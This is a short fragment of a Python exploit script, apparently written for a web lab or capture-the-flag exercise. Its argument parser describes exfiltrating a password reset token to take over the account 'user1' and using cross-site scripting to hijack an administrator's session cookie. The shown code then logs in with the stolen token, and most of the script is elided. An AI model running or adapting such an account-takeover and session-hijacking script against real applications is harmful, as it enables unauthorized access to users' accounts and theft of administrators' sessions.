...
def main():
    parser = argparse.ArgumentParser(description="Exfiltrate password reset token to get an unauthorized access to user `user1`. XSS to Hijack Admin's Session Cookie.")
    ...
    if password_reset_token:
        norml_user_session = nrmlUserLogin(args.target, password_reset_token)
        try:
